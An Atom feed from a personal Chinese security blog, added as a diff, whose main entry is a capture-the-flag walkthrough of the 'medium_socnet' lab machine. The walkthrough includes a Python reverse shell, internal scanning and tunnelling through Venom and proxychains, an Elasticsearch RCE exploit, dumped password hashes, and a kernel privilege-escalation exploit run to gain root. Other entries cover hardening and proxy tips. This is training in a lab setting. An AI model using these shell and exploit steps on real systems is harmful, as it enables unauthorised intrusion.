@@ -1,0 +1,365 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://zhangdeanquan.github.io</id>
+    <title></title>
+    <updated>2022-11-26T15:20:16.746Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://zhangdeanquan.github.io"/>
+    <link rel="self" href="https://zhangdeanquan.github.io/atom.xml"/>
+    <subtitle>民国三年等不到一场雨，此生等不到表哥一句我带你~</subtitle>
+    <logo>https://zhangdeanquan.github.io/images/avatar.png</logo>
+    <icon>https://zhangdeanquan.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2022, </rights>
+    <entry>
+        <title type="html"><![CDATA[medium_socnet]]></title>
+        <id>https://zhangdeanquan.github.io/medium_socnet/</id>
+        <link href="https://zhangdeanquan.github.io/medium_socnet/">
+        </link>
+        <updated>2022-11-26T12:02:48.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="打靶学习">打靶学习</h1>
+<p><strong>刻意练习打靶，在头脑中形成可复用的渗透测试经验，以此提高技能水平</strong></p>
+<h2 id="2层网络发现靶机ip">2层网络发现靶机ip</h2>
+<p><strong>靶机(192.168.5.128)</strong><br>
+<strong>kali(192.168.5.129)</strong></p>
+<pre><code>sudo arp-scan -l
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://zhangdeanquan.github.io/post-images/1669465366253.png" alt="" loading="lazy"></figure>
+<h2 id="端口扫描">端口扫描</h2>
+<pre><code>nmap -sT -p- 192.168.5.128
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://zhangdeanquan.github.io/post-images/1669472015902.png" alt="" loading="lazy"></figure>
+<h2 id="服务版本探测">服务版本探测</h2>
+<pre><code>sudo nmap -sT -p22,5000 -sV 192.168.5.128
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://zhangdeanquan.github.io/post-images/1669472552324.png" alt="" loading="lazy"></figure>
+<h2 id="目录扫描">目录扫描</h2>
+<p>dirsearch</p>
+<pre><code>http://192.168.5.128:5000/admin
+</code></pre>
+<h2 id="后台反弹shell">后台反弹shell</h2>
+<p>python反弹shell</p>
+<pre><code>import socket,os,subprocess
+RHOST='192.168.5.129'  # Change it
+RPORT=4444  # Change it
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  # 创建一个TCP-socket对象
+s.connect((RHOST,RPORT)) 	
+os.dup2(s.fileno(),0)		
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])  
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://zhangdeanquan.github.io/post-images/1669465599182.png" alt="" loading="lazy"></figure>
+<h2 id="确定docker容器">确定docker容器</h2>
+<pre><code>ls  /.dockerenv	
+cat /proc/1/cgroup		//出现docker字样
+</code></pre>
+<p><img src="https://zhangdeanquan.github.io/post-images/1669465678213.png" alt="" loading="lazy"><br>
+<img src="https://zhangdeanquan.github.io/post-images/1669465686016.png" alt="" loading="lazy"></p>
+<h2 id="内网主机ping探活">内网主机ping探活</h2>
+<pre><code>for i in $(seq 1 254);do ping -c 1 172.17.0.$i;done
+
+https://blog.csdn.net/datanese/article/details/53227292
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://zhangdeanquan.github.io/post-images/1669465763498.png" alt="" loading="lazy"></figure>
+<p><strong>从第4台就没有机子存活了</strong><br>
+<img src="https://zhangdeanquan.github.io/post-images/1669465809279.png" alt="" loading="lazy"></p>
+<h2 id="内网隧道搭建">内网隧道搭建</h2>
+<p><strong>本次使用venom搭建隧道，都快2023了，工具完全可以换个更便捷的</strong></p>
+<pre><code>https://github.com/Dliv3/Venom/
+</code></pre>
+<h3 id="python3开启http服务并赋予执行权限">python3开启http服务并赋予执行权限</h3>
+<p><img src="https://zhangdeanquan.github.io/post-images/1669466590545.png" alt="" loading="lazy"><br>
+<img src="https://zhangdeanquan.github.io/post-images/1669466603990.png" alt="" loading="lazy"></p>
+<pre><code>admin监听端口，agent发起连接:
+admin.exe -lport 9999
+agent.exe -rhost 192.168.0.103 -rport 9999
+agent监听端口，admin发起连接:
+agent.exe -lport 8888
+admin.exe -rhost 192.168.204.139 -rport 8888
+————————————————
+版权声明：本文为CSDN博主「猫星人不会笑」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
+原文链接：https://blog.csdn.net/u011215939/article/details/103403545
+//根据实战环境更换
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://zhangdeanquan.github.io/post-images/1669467910714.png" alt="" loading="lazy"></figure>
+<pre><code>靶机：192.168.5.128
+kali: 192.168.5.129
+</code></pre>
+<h3 id="kali本机开启socks服务">kali本机开启socks服务</h3>
+<pre><code>show				//查看帮助选项	
+goto 1				//进入1节点
+socks 1080			//开启socks服务并绑定1080端口
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://zhangdeanquan.github.io/post-images/1669468766059.png" alt="" loading="lazy"></figure>
+<h3 id="配置proxychains">配置proxychains</h3>
+<p>配置proxychains访问内网并探测内网主机/服务</p>
+<pre><code>proxychains nmap -Pn -sT 172.17.0.1	 //22,5000
+proxychains nmap -Pn -sT 172.17.0.3	 //9200
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://zhangdeanquan.github.io/post-images/1669469296089.png" alt="" loading="lazy"></figure>
+<h3 id="内网主机-版本服务发现">内网主机、版本服务发现</h3>
+<pre><code>proxychains nmap -Pn -sT -sV  172.17.0.1-3
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://zhangdeanquan.github.io/post-images/1669471758544.png" alt="" loading="lazy"></figure>
+<h2 id="searchsploit搜索">Searchsploit搜索</h2>
+<p>searchsploit Elasticsearch</p>
+<p><strong>远程rce获取root权限</strong></p>
+<p>获取password  hash</p>
+<pre><code>searchsploit Elasticsearch
+locate linux/remote/36337.py
+cp /usr/share/exploitdb/exploits/linux/remote/36337.py .
+proxychains python 36337.py 172.17.0.3  
+</code></pre>
+<h3 id="sudo权限检查">sudo权限检查</h3>
+<pre><code>sudo -s		//查看是否具有sudo权限
+</code></pre>
+<h3 id="查看权限当前目录下发现密码本">查看权限，当前目录下发现密码本</h3>
+<p><img src="https://zhangdeanquan.github.io/post-images/1669470480453.png" alt="" loading="lazy"><br>
+<img src="https://zhangdeanquan.github.io/post-images/1669470539669.png" alt="" loading="lazy"></p>
+<h3 id="对收集的密码逐一解密">对收集的密码逐一解密</h3>
+<p>https://www.somd5.com/<br>
+<img src="https://zhangdeanquan.github.io/post-images/1669471825203.png" alt="" loading="lazy"></p>
+<pre><code>john:3f8184a7343664553fcb5337a3138814 	//1337hack
+test:861f194e9d6118f3d942a72be3e51749	//somd5没解
+admin:670c3bbc209a18dde5446e5e6c1f1d5b	//somd5没解
+root:b3d34352fc26117979deabdf1b9b6354	//somd5没解
+jane:5c158b60ed97c723b673529b8a3cf72b	//somd5没解
+</code></pre>
+<h2 id="本地提权">本地提权</h2>
+<p>登陆本地用户john进行提权</p>
+<pre><code>searchsploit linux 3.13
+cp /usr/share/exploitdb/exploits/linux/local/37292.c .
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://zhangdeanquan.github.io/post-images/1669471891135.png" alt="" loading="lazy"></figure>
+<p><strong>目标机器无gcc，本地相同系统编译执行</strong><br>
+<img src="https://zhangdeanquan.github.io/post-images/1669472162181.png" alt="" loading="lazy"></p>
+<h3 id="修改gcc代码并编译">修改gcc代码，并编译</h3>
+<p>删除<br>
+<img src="https://zhangdeanquan.github.io/post-images/1669472197836.png" alt="" loading="lazy"><br>
+<strong>由于修改了gcc代码，这里还要同时上传ofs-lib.so文件</strong></p>
+<pre><code>cp -p /usr/share/metasploit-framework/data/exploits/CVE-2015-1328/ofs-lib.so .
+</code></pre>
+<p><strong>通过python开启http，目标机下载执行</strong></p>
+<figure data-type="image" tabindex="11"><img src="https://zhangdeanquan.github.io/post-images/1669472272809.png" alt="" loading="lazy"></figure>
+<h3 id="成功拿到root权限">成功拿到root权限</h3>
+<figure data-type="image" tabindex="12"><img src="https://zhangdeanquan.github.io/post-images/1669472312987.png" alt="" loading="lazy"></figure>
+<h3 id="确定该环境是docker搭建">确定该环境是docker搭建</h3>
+<figure data-type="image" tabindex="13"><img src="https://zhangdeanquan.github.io/post-images/1669472335107.png" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Windows安全加固-修改默认远程连接端口]]></title>
+        <id>https://zhangdeanquan.github.io/修改远程连接默认端口/</id>
+        <link href="https://zhangdeanquan.github.io/修改远程连接默认端口/">
+        </link>
+        <updated>2022-07-09T09:16:04.000Z</updated>
+        <content type="html"><![CDATA[<p>适用场景：Windows主机使用默认远程端口进行连接</p>
+<p>修改默认端口，防止爆破。</p>
+<p><strong>注册表路径</strong></p>
+<pre><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://zhangdeanquan.github.io/post-images/1665309248322.jpg" alt="" loading="lazy"></figure>
+<pre><code>HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/Terminal Server/WinStations/RDP-Tcp
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://zhangdeanquan.github.io/post-images/1665309257704.jpg" alt="" loading="lazy"></figure>
+<p><strong>重启服务</strong></p>
+<pre><code>net stop termservice    //管理员权限运行
+net start termservice       
+</code></pre>
+<p><strong>远程连接时带上端口号即可：</strong></p>
+<figure data-type="image" tabindex="3"><img src="https://zhangdeanquan.github.io/post-images/1665309270607.jpg" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Linux安全加固-禁ping]]></title>
+        <id>https://zhangdeanquan.github.io/NoICMP/</id>
+        <link href="https://zhangdeanquan.github.io/NoICMP/">
+        </link>
+        <updated>2022-06-26T14:20:46.000Z</updated>
+        <content type="html"><![CDATA[<pre><code>echo 1 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all
+</code></pre>
+<p><strong>不响应ICMP请求</strong></p>
+<figure data-type="image" tabindex="1"><img src="https://zhangdeanquan.github.io/post-images/1664202310410.jpg" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[ip匿名自测]]></title>
+        <id>https://zhangdeanquan.github.io/匿名自测/</id>
+        <link href="https://zhangdeanquan.github.io/匿名自测/">
+        </link>
+        <updated>2022-05-05T11:44:18.000Z</updated>
+        <content type="html"><![CDATA[<p>黑客街<br>
+https://www.hackjie.com/tracking</p>
+<figure data-type="image" tabindex="1"><img src="https://zhangdeanquan.github.io/post-images/1663837471100.jpg" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[介绍2个安全搜索网站]]></title>
+        <id>https://zhangdeanquan.github.io/安全网站/</id>
+        <link href="https://zhangdeanquan.github.io/安全网站/">
+        </link>
+        <updated>2022-02-02T12:05:46.000Z</updated>
+        <content type="html"><![CDATA[<p><strong>1、风炫安全</strong><br>
+对全网文章进行采集，输入关键词即可搜索<br>
+https://www.evalshell.com/</p>
+<figure data-type="image" tabindex="1"><img src="https://zhangdeanquan.github.io/post-images/1663675768635.jpg" alt="" loading="lazy"></figure>
+<p><strong>2、红客</strong><br>
+匿名搜索（自测）<br>
+https://www.hong.ke/</p>
+<figure data-type="image" tabindex="2"><img src="https://zhangdeanquan.github.io/post-images/1663675773889.jpg" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[代理本地msf进入内网]]></title>
+        <id>https://zhangdeanquan.github.io/msf进入内网/</id>
+        <link href="https://zhangdeanquan.github.io/msf进入内网/">
+        </link>
+        <updated>2021-07-15T10:14:04.000Z</updated>
+        <content type="html"><![CDATA[<p>使用kali自带的proxychains</p>
+<pre><code>proxychains msfconsole
+
+</code></pre>
+<p>或者在set payload后，设置msf代理</p>
+<pre><code>set proxies socks5:192.168.0.1:1080
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[linux 查看命令执行成功与否]]></title>
+        <id>https://zhangdeanquan.github.io/linux命令执行情况/</id>
+        <link href="https://zhangdeanquan.github.io/linux命令执行情况/">
+        </link>
+        <updated>2021-02-04T02:33:49.000Z</updated>
+        <content type="html"><![CDATA[<p>安装软件，起服务不知道执行情况？</p>
+<p>echo $?<br>
+返回0则表示执行成功</p>
+<pre><code>┌──(root💀kali)-[~]
+└─# apt install tree
+正在读取软件包列表... 完成
+正在分析软件包的依赖关系树... 完成
+正在读取状态信息... 完成                 
+将会同时安装下列软件：
+  libc-bin libc-dev-bin libc-l10n libc6 libc6-dev libc6-i386
+  locales rpcsvc-proto
+建议安装：
+  glibc-doc libnss-nis libnss-nisplus manpages-dev
+推荐安装：
+  manpages-dev libc-devtools
+下列【新】软件包将被安装：
+  rpcsvc-proto tree
+下列软件包将被升级：
+  libc-bin libc-dev-bin libc-l10n libc6 libc6-dev libc6-i386
+  locales
+升级了 7 个软件包，新安装了 2 个软件包，要卸载 0 个软件包，有 1676 个软件包未被升级。
+需要下载 13.5 MB 的归档。
+解压缩后将会空出 4,438 kB 的空间。
+您希望继续执行吗？ [Y/n] Y
+获取:1 http://kali.download/kali kali-rolling/main amd64 libc-l10n all 2.34-4 [876 kB]
+获取:2 http://kali.download/kali kali-rolling/main amd64 libc-dev-bin amd64 2.34-4 [246 kB]
+获取:3 http://kali.download/kali kali-rolling/main amd64 libc6-dev amd64 2.34-4 [1,894 kB]
+获取:4 http://kali.download/kali kali-rolling/main amd64 rpcsvc-proto amd64 1.4.2-4 [63.1 kB]                   
+获取:5 http://kali.download/kali kali-rolling/main amd64 libc6-i386 amd64 2.34-4 [2,639 kB]                     
+获取:6 http://kali.download/kali kali-rolling/main amd64 locales all 2.34-4 [4,091 kB]                          
+获取:7 http://kali.download/kali kali-rolling/main amd64 libc6 amd64 2.34-4 [2,765 kB]                          
+获取:8 http://kali.download/kali kali-rolling/main amd64 libc-bin amd64 2.34-4 [897 kB]                         
+获取:9 http://kali.download/kali kali-rolling/main amd64 tree amd64 2.0.3-1 [56.4 kB]                           
+已下载 13.5 MB，耗时 23秒 (579 kB/s)                                                                            
+正在预设定软件包 ...
+(正在读取数据库 ... 系统当前共安装有 267124 个文件和目录。)
+准备解压 .../0-libc-l10n_2.34-4_all.deb  ...
+正在解压 libc-l10n (2.34-4) 并覆盖 (2.31-9) ...
+准备解压 .../1-libc-dev-bin_2.34-4_amd64.deb  ...
+正在解压 libc-dev-bin (2.34-4) 并覆盖 (2.31-9) ...
+准备解压 .../2-libc6-dev_2.34-4_amd64.deb  ...
+正在解压 libc6-dev:amd64 (2.34-4) 并覆盖 (2.31-9) ...
+正在替换原软件包中的文件 libc6:amd64 (2.31-9) ...
+正在选中未选择的软件包 rpcsvc-proto。
+准备解压 .../3-rpcsvc-proto_1.4.2-4_amd64.deb  ...
+正在解压 rpcsvc-proto (1.4.2-4) ...
+准备解压 .../4-libc6-i386_2.34-4_amd64.deb  ...
+正在解压 libc6-i386 (2.34-4) 并覆盖 (2.31-9) ...
+准备解压 .../5-locales_2.34-4_all.deb  ...
+正在解压 locales (2.34-4) 并覆盖 (2.31-9) ...
+准备解压 .../6-libc6_2.34-4_amd64.deb  ...
+Checking for services that may need to be restarted...
+Checking init scripts...
+正在解压 libc6:amd64 (2.34-4) 并覆盖 (2.31-9) ...
+正在设置 libc6:amd64 (2.34-4) ...
+Checking for services that may need to be restarted...
+Checking init scripts...
+
+Restarting services possibly affected by the upgrade:
+  cron: restarting...done.
+
+Services restarted successfully.
+(正在读取数据库 ... 系统当前共安装有 267098 个文件和目录。)
+准备解压 .../libc-bin_2.34-4_amd64.deb  ...
+正在解压 libc-bin (2.34-4) 并覆盖 (2.31-9) ...
+正在设置 libc-bin (2.34-4) ...
+正在选中未选择的软件包 tree。
+(正在读取数据库 ... 系统当前共安装有 267098 个文件和目录。)
+准备解压 .../tree_2.0.3-1_amd64.deb  ...
+正在解压 tree (2.0.3-1) ...
+正在设置 libc-l10n (2.34-4) ...
+正在设置 locales (2.34-4) ...
+正在安装新版本配置文件 /etc/locale.alias ...
+Generating locales (this might take a while)...
+  zh_CN.UTF-8... done
+Generation complete.
+正在设置 rpcsvc-proto (1.4.2-4) ...
+正在设置 tree (2.0.3-1) ...
+正在设置 libc6-i386 (2.34-4) ...
+正在设置 libc-dev-bin (2.34-4) ...
+正在设置 libc6-dev:amd64 (2.34-4) ...
+正在处理用于 man-db (2.9.3-2) 的触发器 ...
+正在处理用于 kali-menu (2021.1.4) 的触发器 ...
+正在处理用于 libc-bin (2.34-4) 的触发器 ...
+                                                                                                                 
+┌──(root💀kali)-[~]
+└─# echo $?
+0
+                                                                                                                 
+┌──(root💀kali)-[~]
+└─# 
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[kali下proxychains使用sock5]]></title>
+        <id>https://zhangdeanquan.github.io/kali设置proxychains/</id>
+        <link href="https://zhangdeanquan.github.io/kali设置proxychains/">
+        </link>
+        <updated>2020-09-09T12:38:51.000Z</updated>
+        <content type="html"><![CDATA[<p>问题：kali proxychains使用sock5无法代理流量</p>
+<p>解决：删除dynamic_chain前面的#号<br>
+在strict_chain前面填写上#号</p>
+<p>如图所示：</p>
+<figure data-type="image" tabindex="1"><img src="https://zhangdeanquan.github.io/post-images/1663206783122.jpg" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[解决bilibili视频锁]]></title>
+        <id>https://zhangdeanquan.github.io/jie-jue-bilibili-shi-pin-suo/</id>
+        <link href="https://zhangdeanquan.github.io/jie-jue-bilibili-shi-pin-suo/">
+        </link>
+        <updated>2020-08-11T09:08:20.000Z</updated>
+        <content type="html"><![CDATA[<p>有时bilibili下载的视频遭遇无法播放<br>
+<img src="https://zhangdeanquan.github.io/post-images/1663146709757.jpg" alt="" loading="lazy"></p>
+<p>解决方案：<br>
+编辑器打开视频文件，删除视频锁标志(前面的16进制位)<br>
+我这里使用notepad++<br>
+<img src="https://zhangdeanquan.github.io/post-images/1663148496477.png" alt="" loading="lazy"></p>
+<p>视频正常播放<br>
+<img src="https://zhangdeanquan.github.io/post-images/1663148653017.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Hello world]]></title>
+        <id>https://zhangdeanquan.github.io/hello-world/</id>
+        <link href="https://zhangdeanquan.github.io/hello-world/">
+        </link>
+        <updated>2018-12-11T16:00:00.000Z</updated>
+        <content type="html"><![CDATA[<p>你好世界！</p>
+]]></content>
+    </entry>
+</feed>
